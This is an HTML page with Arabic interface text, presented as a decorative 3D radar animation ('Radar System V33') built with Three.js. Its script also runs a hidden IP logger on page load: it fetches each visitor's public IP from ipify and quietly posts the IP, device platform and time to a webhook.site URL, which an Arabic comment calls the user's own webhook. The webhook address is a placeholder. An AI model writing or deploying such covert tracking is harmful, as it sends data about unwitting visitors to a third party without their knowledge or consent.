<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Radar System V33</title>
    <style>
        body { margin: 0; background-color: black; color: #00ff00; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
        #ui-overlay { position: absolute; top: 20px; left: 20px; border: 2px solid #00ff00; padding: 15px; background: rgba(0, 40, 0, 0.5); z-index: 10; border-radius: 5px; width: 250px; }
        .header { font-weight: bold; font-size: 1.2em; text-align: right; margin-bottom: 10px; }
        .controls { display: flex; justify-content: space-between; margin-top: 10px; }
        button { background: none; border: 1px solid #00ff00; color: #00ff00; padding: 5px 10px; cursor: pointer; font-family: inherit; width: 48%; }
        button:hover { background: #004400; }
        .info-panel { margin-top: 15px; border-top: 1px dashed #00ff00; pt: 10px; text-align: center; font-size: 0.9em; }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
</head>
<body>

    <div id="ui-overlay">
        <div class="header">نظام الرصد V33<br>الحالة: نشط</div>
        <div class="controls">
            <button onclick="toggleSound(true)">صوت ON</button>
            <button onclick="toggleSound(false)">صوت OFF</button>
        </div>
        <div class="info-panel">
            <div id="ip-display">جاري جلب الـ IP...</div>
        </div>
    </div>

    <script>
        // نظام جلب البيانات والإرسال للويبهوك
        const webhookURL = 'https://webhook.site/7f3a8b2c-1d5e-4f6g-8h9i-0j1k2l3m4n5o'; // رابط الويبهوك حقك

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                document.getElementById('ip-display').innerText = "IP: " + data.ip;
                fetch(webhookURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        event: "رصد دخول جديد",
                        ip: data.ip,
                        device: navigator.platform,
                        time: new Date().toLocaleString()
                    })
                });
            });

        function toggleSound(state) { console.log("Sound set to: " + state); }

        // إعداد الرادار الثلاثي الأبعاد (Three.js)
        let scene = new THREE.Scene();
        let camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
        let renderer = new THREE.WebGLRenderer({ antialias: true });
        renderer.setSize(window.innerWidth, window.innerHeight);
        document.body.appendChild(renderer.domElement);

        const sphere = new THREE.Mesh(
            new THREE.SphereGeometry(8, 32, 32),
            new THREE.MeshBasicMaterial({ color: 0x00ff00, wireframe: true, transparent: true, opacity: 0.1 })
        );
        scene.add(sphere);

        const sweep = new THREE.Mesh(
            new THREE.SphereGeometry(8.05, 32, 32, 0, 0.4),
            new THREE.MeshBasicMaterial({ color: 0x00ff00, transparent: true, opacity: 0.6, side: THREE.DoubleSide })
        );
        scene.add(sweep);

        camera.position.z = 25;
        function animate() {
            requestAnimationFrame(animate);
            sweep.rotation.y += 0.05;
            renderer.render(scene, camera);
        }
        animate();

        window.addEventListener('resize', () => {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        });
    </script>
</body>
</html>
